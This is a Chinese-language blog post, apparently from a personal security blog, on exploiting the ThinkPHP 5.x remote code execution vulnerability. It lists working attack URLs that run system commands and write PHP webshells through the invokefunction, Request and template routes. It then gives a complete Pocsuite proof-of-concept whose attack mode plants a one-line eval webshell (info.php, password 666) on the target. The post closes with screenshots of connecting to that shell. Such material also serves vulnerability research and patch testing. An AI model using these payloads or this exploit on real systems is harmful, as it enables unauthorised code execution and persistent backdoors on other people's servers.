@@ -1,0 +1,1198 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next mist" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.ico?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="thinkphp,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="不如茶酒伴" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="半醉半醒日复日,花落花开年复年。  2019了。 漏洞分析">
+<meta name="keywords" content="thinkphp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于Pocsuite的ThinkPHP 5.x 远程代码执行漏洞利用">
+<meta property="og:url" content="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/index.html">
+<meta property="og:site_name" content="不如茶酒伴">
+<meta property="og:description" content="半醉半醒日复日,花落花开年复年。  2019了。 漏洞分析">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/thinphp-5.x-release.JPG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/thinkphp-5.x-test.JPG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/thinkphp-5.x-shuipaopao.JPG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/thinkphp-5.x-pocsuite.JPG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/thinkphp-5.x-yijian2.JPG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/thinkphp-5.x-yijian.JPG">
+<meta property="og:updated_time" content="2019-02-13T05:10:44.078Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基于Pocsuite的ThinkPHP 5.x 远程代码执行漏洞利用">
+<meta name="twitter:description" content="半醉半醒日复日,花落花开年复年。  2019了。 漏洞分析">
+<meta name="twitter:image" content="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/thinphp-5.x-release.JPG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/">
+
+
+
+
+
+  <title>基于Pocsuite的ThinkPHP 5.x 远程代码执行漏洞利用 | 不如茶酒伴</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">不如茶酒伴</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">你看，那个人好奇怪哦！是啊，好像一条狗！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://0xp1n3.github.io/2019/01/11/thinkphp-5-x-pocsuite/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="p1n3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="不如茶酒伴">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">基于Pocsuite的ThinkPHP 5.x 远程代码执行漏洞利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-11T14:58:00-08:00">
+                一月 12,2019
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>半醉半醒日复日,花落花开年复年。</p>
+</blockquote>
+<p>2019了。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><a id="more"></a>
+<p>漏洞分析有很多大佬巨佬做过了，我就不献丑了emmmm<br>给大家找了一篇分析paper，建议去研究研究</p>
+<p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">水泡泡</a></p>
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><ul>
+<li>漏洞影响:Thinkphp 5.0.23及5.1.31以下(即12月9日安全更新前所有版本)</li>
+<li><img src="thinphp-5.x-release.JPG" alt=""></li>
+<li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener">vulnspy的漏洞源码</a></li>
+<li><a href="http://www.thinkphp.cn/down/p/1.html" target="_blank" rel="noopener">官方漏洞源码</a></li>
+<li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener">官方github源码</a></li>
+<li><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">Thinkphp v5.0.x补丁</a></li>
+<li><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">Thinkphp v5.1.x补丁</a></li>
+<li><a href="https://www.seebug.org/vuldb/ssvid-97767" target="_blank" rel="noopener">seebug</a></li>
+</ul>
+<p>注意:官网只有5.0.x的版本，测试5.1.x需要到github自己clone一个再用composer安装或者用vulnspy的</p>
+<ul>
+<li><a href="http://www.thinkphp.cn/topic/52362.html" target="_blank" rel="noopener">composer</a></li>
+</ul>
+<h2 id="全平台共有具有漏洞的类"><a href="#全平台共有具有漏洞的类" class="headerlink" title="全平台共有具有漏洞的类"></a>全平台共有具有漏洞的类</h2><p>可以继续挖掘更多payload，我就不(tai)来(cai)了(le)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">think\Route</span><br><span class="line">think\Loader</span><br><span class="line">think\Error</span><br><span class="line">think\App</span><br><span class="line">think\Env</span><br><span class="line">think\Config</span><br><span class="line">think\Hook</span><br><span class="line">think\Lang</span><br><span class="line">think\Request</span><br><span class="line">think\Log</span><br></pre></td></tr></table></figure>
+<h2 id="编写前准备"><a href="#编写前准备" class="headerlink" title="编写前准备"></a>编写前准备</h2><p>对于网上的payload进行了收集,本打算基于以下四个payload进行Poc的编写</p>
+<h3 id="Request-input"><a href="#Request-input" class="headerlink" title="Request/input"></a>Request/input</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">index.php?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php</span><br></pre></td></tr></table></figure>
+<h3 id="Request-cache"><a href="#Request-cache" class="headerlink" title="Request/cache"></a>Request/cache</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\request/cache&amp;key=1|phpinfo</span><br><span class="line">index.php?s=index/\think\request/cache&amp;key=dir|system</span><br><span class="line">index.php?s=index/\think\request/cache&amp;key=<span class="built_in">echo</span>%20%22&lt;?php%20eval(<span class="variable">$_POST</span>[cmd])?&gt;%22%20&gt;%20a.php|system</span><br></pre></td></tr></table></figure>
+<h3 id="container-invokefunction"><a href="#container-invokefunction" class="headerlink" title="container/invokefunction"></a>container/invokefunction</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure>
+<h3 id="app-invokefunction"><a href="#app-invokefunction" class="headerlink" title="app/invokefunction"></a>app/invokefunction</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">echo</span>%20%22&lt;?php%20phpinfo();?&gt;%22%20&gt;%20info.php</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure>
+<p>还有一个貌似只能写文件的</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval(<span class="variable">$_POST</span>[123]);?%3C</span><br></pre></td></tr></table></figure>
+<h2 id="Payload测试"><a href="#Payload测试" class="headerlink" title="Payload测试"></a>Payload测试</h2><p>测试的时候发现了些问题</p>
+<p><img src="thinkphp-5.x-test.JPG" alt=""></p>
+<p>前三个paylaod对于5.0.x无效，只有第四个有效</p>
+<p>而5.1.x则通杀</p>
+<p>结合水泡泡的分析</p>
+<p><img src="thinkphp-5.x-shuipaopao.JPG" alt=""></p>
+<p>那就只有app/invokefunction一条路可以走了</p>
+<h2 id="Poc的编写"><a href="#Poc的编写" class="headerlink" title="Poc的编写"></a>Poc的编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThinkphpPoC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">'97767'</span></span><br><span class="line">    version = <span class="string">'1'</span></span><br><span class="line">    author = [<span class="string">'p1n3'</span>]</span><br><span class="line">    vulDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    createDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    updateDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    references = [<span class="string">'https://www.seebug.org/vuldb/ssvid-97767'</span>]</span><br><span class="line">    name = <span class="string">'Thinkphp 5.0.23及5.1.31以下 远程代码执行'</span></span><br><span class="line">    appPowerLink = <span class="string">'http://www.thinkphp.cn/'</span></span><br><span class="line">    appName = <span class="string">'Thinkphp'</span></span><br><span class="line">    appVersion = <span class="string">'5.x'</span></span><br><span class="line">    vulType = <span class="string">'RCE'</span></span><br><span class="line">    desc = <span class="string">'''</span></span><br><span class="line"><span class="string">    由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下</span></span><br><span class="line"><span class="string">    可能的远程代码执行导致getshell，受影响包括Thinkphp全版本，建议更新到最新版或开启强制路由</span></span><br><span class="line"><span class="string">     '''</span></span><br><span class="line">    samples = [<span class="string">''</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        payload = self.url + <span class="string">'/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                             <span class="string">'&amp;vars[0]=print_r&amp;vars[1][]=fae0b27c451c728867a567e8c1bb4e53'</span></span><br><span class="line">        response = req.get(payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># md5(666) 的值</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fae0b27c451c728867a567e8c1bb4e53'</span> <span class="keyword">in</span> str(response.content):</span><br><span class="line">            result = &#123;<span class="string">'VerifyInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'payload'</span>] = payload</span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        info = &#123;</span><br><span class="line">            <span class="string">'ResultCode'</span>: &#123;</span><br><span class="line">                <span class="string">'a'</span>: <span class="keyword">False</span>,</span><br><span class="line">                <span class="string">'b'</span>: <span class="keyword">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        payload1 = self.url + <span class="string">'/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                              <span class="string">'&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20eval($_POST[666]);?%3E'</span></span><br><span class="line">        payload2 = self.url + <span class="string">'/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                              <span class="string">'&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20eval($_POST[666]);?&gt;%22%20&gt;%20info.php'</span></span><br><span class="line">        req.get(payload1)</span><br><span class="line">        <span class="keyword">if</span> req.get(self.url + <span class="string">'/info.php'</span>).status_code == <span class="number">200</span>:</span><br><span class="line">            result = &#123;<span class="string">'AttackInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            info[<span class="string">'ResultCode'</span>][<span class="string">'a'</span>] = <span class="keyword">True</span></span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'payload'</span>] = payload1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            req.get(payload2)</span><br><span class="line">            <span class="keyword">if</span> req.get(self.url + <span class="string">'/info.php'</span>).status_code == <span class="number">200</span>:</span><br><span class="line">                result = &#123;<span class="string">'AttackInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">                info[<span class="string">'ResultCode'</span>][<span class="string">'b'</span>] = <span class="keyword">True</span></span><br><span class="line">                result[<span class="string">'AttackInfo'</span>][<span class="string">'payload'</span>] = payload2</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> info[<span class="string">'ResultCode'</span>][<span class="string">'a'</span>] <span class="keyword">or</span> info[<span class="string">'ResultCode'</span>][<span class="string">'b'</span>]:</span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'shell'</span>] = self.url+<span class="string">'/info.php'</span></span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'pass'</span>] = <span class="string">'666'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'The vulnerability does not appear to be available!'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(ThinkphpPoC)</span><br></pre></td></tr></table></figure>
+<h2 id="Poc测试"><a href="#Poc测试" class="headerlink" title="Poc测试"></a>Poc测试</h2><p><img src="thinkphp-5.x-pocsuite.JPG" alt=""></p>
+<p>还是第一次用Pocsuite，写的不好…你来打我呀</p>
+<p>相比pentestDB等，Pocsuite体验非常不错，打算以后就一直使用Pocsuite好了(如果有更好的框架请务必私信我)</p>
+<p>verify模式忘截图了</p>
+<p>attack模式会直接在同目录下写一句话木马</p>
+<p>祭出法器中国蚁剑</p>
+<p><img src="thinkphp-5.x-yijian2.JPG" alt=""></p>
+<p>文件是info.php 密码666</p>
+<p>很好</p>
+<h2 id="enjoy-it"><a href="#enjoy-it" class="headerlink" title="enjoy it"></a>enjoy it</h2><p><img src="thinkphp-5.x-yijian.JPG" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束,感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+    
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/thinkphp/" rel="tag"><i class="fa fa-tag"></i> thinkphp</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/17/web-scan/" rel="next" title="python打造基于scapy的扫描器">
+                <i class="fa fa-chevron-left"></i> python打造基于scapy的扫描器
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/21/HackInOS/" rel="prev" title="渗透实战:HackInOS靶机入侵">
+                渗透实战:HackInOS靶机入侵 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="p1n3">
+            
+              <p class="site-author-name" itemprop="name">p1n3</p>
+              <p class="site-description motion-element" itemprop="description">何人的归宿是星辰大海?</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sherdh" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=sherdh@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://gh0st.cn/" title="gh0st" target="_blank">gh0st</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://quyunjie.cn/" title="quyunjie" target="_blank">quyunjie</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="chybeta" target="_blank">chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://rcoil.me/" title="Rcoll" target="_blank">Rcoll</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://yulige.top/" title="郁离歌" target="_blank">郁离歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞详情"><span class="nav-number">2.</span> <span class="nav-text">漏洞详情</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#全平台共有具有漏洞的类"><span class="nav-number">3.</span> <span class="nav-text">全平台共有具有漏洞的类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编写前准备"><span class="nav-number">4.</span> <span class="nav-text">编写前准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Request-input"><span class="nav-number">4.1.</span> <span class="nav-text">Request/input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Request-cache"><span class="nav-number">4.2.</span> <span class="nav-text">Request/cache</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#container-invokefunction"><span class="nav-number">4.3.</span> <span class="nav-text">container/invokefunction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#app-invokefunction"><span class="nav-number">4.4.</span> <span class="nav-text">app/invokefunction</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload测试"><span class="nav-number">5.</span> <span class="nav-text">Payload测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Poc的编写"><span class="nav-number">6.</span> <span class="nav-text">Poc的编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Poc测试"><span class="nav-number">7.</span> <span class="nav-text">Poc测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#enjoy-it"><span class="nav-number">8.</span> <span class="nav-text">enjoy it</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">p1n3</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
